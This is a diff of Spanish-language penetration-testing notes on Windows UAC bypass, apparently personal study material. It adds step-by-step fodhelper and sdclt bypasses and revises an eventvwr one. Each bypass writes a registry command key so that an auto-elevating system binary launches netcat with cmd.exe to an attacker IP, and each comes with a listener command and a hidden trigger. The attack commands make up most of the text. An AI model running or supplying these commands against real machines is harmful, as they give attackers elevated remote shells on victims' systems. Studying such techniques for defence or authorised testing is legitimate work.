@@ -17,6 +17,7 @@ UAC (User Account Control) significa Control de cuentas de usuario. Es una funci
 - **Grupo** `BUILTIN\Administrators`**:** comprobar si está habilitado o aparece como `Group used for deny only`. Debe salir como ``Mandatory group, Enable by default..``
 - **Nivel de integridad:** buscar `Medium Mandatory Level`, si es así tiene el UAC. Lo ideal es tener `High Mandatory Level`.
 - **Privilegios:** revisar la sección `PRIVILEGES INFORMATION` y si se tienen pocos privilegios es señal de UAC
+- Se necesita una sesión ``RDP / Consola`` para que funcione 
 
 ## Consultar el valor del UAC 
 
@@ -31,13 +32,7 @@ NOTA:
 	- Si esta habilitado hacer el bypass con 'Eventvwr'
 ```
 
-## Fodhelper
 
-`fodhelper.exe` se ha estudiado en el contexto de técnicas de bypass de UAC. La propiedad `autoElevate` en el manifiesto de un ejecutable puede indicar que Windows permite su elevación automática bajo determinadas condiciones.
-
-```powershell 
-❯ powershell -C Get-Content -Path C:\Windows\System32\fodhelper.exe | findstr /I "autoElevate"
-```
 ## Eventvwr
 
 `eventvwr.exe` se ha estudiado históricamente como parte de técnicas de bypass de UAC. La consulta intenta encontrar una indicación de elevación automática.
@@ -71,13 +66,63 @@ NOTA:
 ```powershell 
 Paso 4:
 # Subir Netcat64 al server y ejecutar el comando 
-❯ REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "c:\temp\nc64.exe -nv IP_Kali 445 -e cmd.exe" /f
+❯ REG ADD HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command /d "C:\Temp\nc64.exe -nv IP_Kali 445 -e cmd.exe" /f
 
 ❯ rlwrap nc -nlvp 445   # Recibir la revershell 
 
 Paso 5:
 ❯ eventvwr.exe   # Ejecutar la revershell 
 ```
+
+## Fodhelper
+
+`fodhelper.exe` se ha estudiado en el contexto de técnicas de bypass de UAC. La propiedad `autoElevate` en el manifiesto de un ejecutable puede indicar que Windows permite su elevación automática bajo determinadas condiciones.
+
+```powershell 
+Paso 1: 
+❯ powershell -C Get-Content -Path C:\Windows\System32\fodhelper.exe | findstr /I "autoElevate"
+
+# Ejemplo de lo que sale:
+	<autoElevate>true</autoElevate>
+```
+
+```bash 
+Paso 2:
+❯ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Temp\nc64.exe -nv 192.168.45.211 443 -e cmd.exe" /f
+
+❯ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
+
+Paso 3:
+❯ rlwrap nc -lvnp 443
+
+Paso 4:
+❯ Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+```
+
+## Sdclt bypass 
+
+```powershell 
+Paso 1: 
+❯ powershell -C Get-Content -Path C:\Windows\System32\sdclt.exe | findstr /I "autoElevate"
+
+# Ejemplo de lo que sale:
+	<autoElevate  xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">true</autoElevate>
+```
+
+```powershell 
+Paso 2:
+❯ REG ADD HKCU\Software\Classes\Folder\shell\open\command /d "C:\Temp\nc64.exe -nv 192.168.45.211 443 -e cmd.exe" /f
+
+❯ REG ADD HKCU\Software\Classes\Folder\shell\open\command /v DelegateExecute /t REG_SZ /d "" /f
+
+Paso 3:
+❯ rlwrap nc -lvnp 443
+
+Paso 4:
+❯ Start-Process "C:\Windows\System32\sdclt.exe" -WindowStyle Hidden
+```
+
+## Otro
 
 ```powershell 
 # Otra forma 
